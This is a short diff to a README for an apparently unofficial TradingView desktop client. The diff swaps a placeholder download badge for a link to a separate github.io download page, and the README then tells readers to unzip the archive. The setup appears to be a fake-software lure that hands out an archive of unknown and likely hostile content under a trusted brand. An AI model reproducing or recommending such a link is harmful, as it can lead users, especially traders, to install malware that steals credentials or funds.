@@ -6,7 +6,7 @@ This unofficial TradingView desktop client brings the popular market analysis an
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://tradingview-download-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
